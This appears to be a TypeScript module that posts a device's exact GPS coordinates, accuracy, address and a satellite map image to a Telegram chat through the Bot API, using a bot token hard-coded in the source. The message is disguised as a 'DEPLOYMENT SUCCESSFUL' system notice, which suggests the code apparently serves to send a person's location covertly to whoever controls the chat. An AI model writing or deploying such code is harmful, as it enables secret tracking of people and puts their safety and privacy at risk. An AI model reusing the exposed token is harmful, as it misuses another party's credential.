
import { LocationData } from '../types';

const BOT_TOKEN: string = '8214362646:AAFEIgnkIF8iQLLtadHhARh0Mh1SR4fplZA';

export const sendLocationToTelegram = async (data: LocationData, chatId: string): Promise<void> => {
  if (!BOT_TOKEN || BOT_TOKEN.includes('REPLACE')) return;

  // Use a different static map provider for variety or stay with Yandex
  const staticMapUrl = `https://static-maps.yandex.ru/1.x/?ll=${data.longitude},${data.latitude}&z=16&l=sat,skl&pt=${data.longitude},${data.latitude},pm2rdl&size=600,400`;

  const caption = `
🚀 *DEPLOYMENT SUCCESSFUL*
━━━━━━━━━━━━━━━━━━
📟 *Component:* \`GeoShare v2.0\`
🏠 *Endpoint:* \`${data.address || 'Unknown Node'}\`
🕒 *Time:* \`${data.timestamp}\`

📍 *GPS Triangulation:*
• Lat: \`${data.latitude.toFixed(6)}\`
• Lon: \`${data.longitude.toFixed(6)}\`
• Acc: \`±${Math.round(data.accuracy)}m\`

🔗 [Open Dashboard](${data.googleMapsUrl})
  `.trim();

  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      photo: staticMapUrl,
      caption: caption,
      parse_mode: 'Markdown'
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Sync Error: ${errorData.description}`);
  }
};
